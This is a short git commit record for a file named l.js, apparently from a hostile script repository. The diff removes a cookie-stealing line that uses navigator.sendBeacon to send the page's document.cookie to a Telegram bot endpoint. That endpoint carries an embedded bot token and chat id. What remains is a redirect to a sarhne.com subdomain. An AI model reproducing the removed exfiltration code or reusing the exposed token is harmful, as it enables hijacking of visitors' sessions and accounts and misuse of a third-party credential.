de15e1e25e6e9f5c4517485e5ce6d58576356e96
ae54 <chromscurity11@gmail.com>
2025-05-25 17:31:51 +0300

    Update l.js

--- l.js
+++ l.js
@@ -1,2 +1,1 @@
-navigator.sendBeacon(`https://api.telegram.org/bot7858688597:AAHkWaP75HtsOoU-9UvK094DuONFzZ48VWY/sendMessage?chat_id=5864267471&text=${encodeURIComponent(document.cookie)}`);
-window.location.href = "https://201376777563513.sarhne.com";
+window.location.href = "https://abdo.sarhne.com";
